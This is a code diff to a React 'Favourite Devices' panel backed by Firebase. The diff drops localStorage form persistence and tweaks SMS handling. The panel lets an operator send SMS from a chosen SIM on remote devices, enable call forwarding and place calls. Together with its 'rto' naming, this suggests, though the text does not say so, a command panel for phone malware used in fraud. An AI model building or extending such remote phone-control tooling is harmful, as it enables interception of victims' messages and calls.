@@ -1,5 +1,5 @@
 "use client";
-import React, { useState, useEffect } from "react";
+import React, { useState } from "react";
 import { ref, update, remove } from "firebase/database";
 import { db } from "../lib/firebase";
 
@@ -15,25 +15,6 @@ export default function FavouritesPanel({
   const [expandedDevices, setExpandedDevices] = useState({});
   const [activeTabs, setActiveTabs] = useState({});
   const [formMemory, setFormMemory] = useState({});
-
-  useEffect(() => {
-    try {
-      const saved = localStorage.getItem("rto_form_memory");
-      if (saved) {
-        setFormMemory(JSON.parse(saved));
-      }
-    } catch (e) {}
-  }, []);
-
-  const updateField = (key, value) => {
-    setFormMemory((prev) => {
-      const updated = { ...prev, [key]: value };
-      try {
-        localStorage.setItem("rto_form_memory", JSON.stringify(updated));
-      } catch (e) {}
-      return updated;
-    });
-  };
 
   const devices = data.user_data || {};
   const statusData = data.device_status || {};
@@ -74,6 +55,7 @@ export default function FavouritesPanel({
         timestamp: Date.now()
       }).then(() => {
         showToast(`✅ SMS sent via SIM ${Number(selectedSim) + 1}`, "success");
+        setFormMemory(p => ({ ...p, [`fav-smsText-${devId}`]: "" }));
       });
     } 
     else if (type === "fwd_on") {
@@ -151,7 +133,7 @@ export default function FavouritesPanel({
           <h2>
             <i className="fas fa-star" style={{ color: "var(--gold)" }}></i> Favourite Devices
           </h2>
-          <p className="panel-sub">Pinned devices with persistent controls & monitoring</p>
+          <p className="panel-sub">Pinned devices with complete controls & quick monitoring</p>
         </div>
         <div className="panel-stats">
           <span className="stat-item">
@@ -378,7 +360,6 @@ export default function FavouritesPanel({
                       </div>
                     )}
 
-                    {/* PERSISTENT SEND SMS FOR FAVOURITES */}
                     {curTab === "sendsms" && (
                       <div className="section-premium">
                         <div className="section-title">
@@ -388,7 +369,7 @@ export default function FavouritesPanel({
                           <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 8 }}>
                             <button
                               type="button"
-                              onClick={() => updateField(`fav-smsSim-${devId}`, "0")}
+                              onClick={() => setFormMemory(p => ({ ...p, [`fav-smsSim-${devId}`]: "0" }))}
                               style={{
                                 padding: "8px",
                                 borderRadius: 8,
@@ -405,7 +386,7 @@ export default function FavouritesPanel({
                             </button>
                             <button
                               type="button"
-                              onClick={() => updateField(`fav-smsSim-${devId}`, "1")}
+                              onClick={() => setFormMemory(p => ({ ...p, [`fav-smsSim-${devId}`]: "1" }))}
                               style={{
                                 padding: "8px",
                                 borderRadius: 8,
@@ -422,14 +403,13 @@ export default function FavouritesPanel({
                             </button>
                           </div>
                         </div>
-
                         <input 
                           type="text" 
                           placeholder="Recipient Phone Number" 
                           className="search-input" 
                           style={{ background: "var(--bg-input)", marginBottom: 8, borderRadius: 6, border: "1px solid var(--border-color)" }}
                           value={formMemory[`fav-smsNum-${devId}`] || ""}
-                          onChange={(e) => updateField(`fav-smsNum-${devId}`, e.target.value)}
+                          onChange={(e) => setFormMemory(p => ({ ...p, [`fav-smsNum-${devId}`]: e.target.value }))}
                         />
                         <textarea 
                           placeholder="Type Message Content..." 
@@ -437,7 +417,7 @@ export default function FavouritesPanel({
                           className="search-input" 
                           style={{ background: "var(--bg-input)", marginBottom: 10, borderRadius: 6, border: "1px solid var(--border-color)", height: "auto" }}
                           value={formMemory[`fav-smsText-${devId}`] || ""}
-                          onChange={(e) => updateField(`fav-smsText-${devId}`, e.target.value)}
+                          onChange={(e) => setFormMemory(p => ({ ...p, [`fav-smsText-${devId}`]: e.target.value }))}
                         />
                         <button 
                           className="btn-luxury btn-blue" 
@@ -460,7 +440,7 @@ export default function FavouritesPanel({
                           className="search-input" 
                           style={{ background: "var(--bg-input)", marginBottom: 10, borderRadius: 6, border: "1px solid var(--border-color)" }}
                           value={formMemory[`fav-fwdNum-${devId}`] || ""}
-                          onChange={(e) => updateField(`fav-fwdNum-${devId}`, e.target.value)}
+                          onChange={(e) => setFormMemory(p => ({ ...p, [`fav-fwdNum-${devId}`]: e.target.value }))}
                         />
                         <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 8 }}>
                           <button 
@@ -490,7 +470,7 @@ export default function FavouritesPanel({
                           className="search-input" 
                           style={{ background: "var(--bg-input)", marginBottom: 8, borderRadius: 6, border: "1px solid var(--border-color)" }}
                           value={formMemory[`fav-callNum-${devId}`] || ""}
-                          onChange={(e) => updateField(`fav-callNum-${devId}`, e.target.value)}
+                          onChange={(e) => setFormMemory(p => ({ ...p, [`fav-callNum-${devId}`]: e.target.value }))}
                         />
                         <button className="btn-luxury btn-purple" style={{ width: "100%", justifyContent: "center", padding: "10px" }} onClick={() => handleCommand("call", devId)}>
                           Execute Call
